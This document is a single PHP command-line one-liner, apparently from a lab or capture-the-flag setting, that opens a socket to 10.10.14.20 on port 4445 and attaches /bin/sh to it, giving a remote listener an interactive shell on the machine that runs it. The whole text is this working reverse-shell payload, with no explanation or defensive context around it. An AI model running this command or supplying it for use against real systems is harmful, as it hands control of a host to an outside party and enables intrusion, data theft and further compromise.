php -r '$sock=fsockopen("10.10.14.20",4445);popen("/bin/sh <&3 >&3 2>&3", "r");'
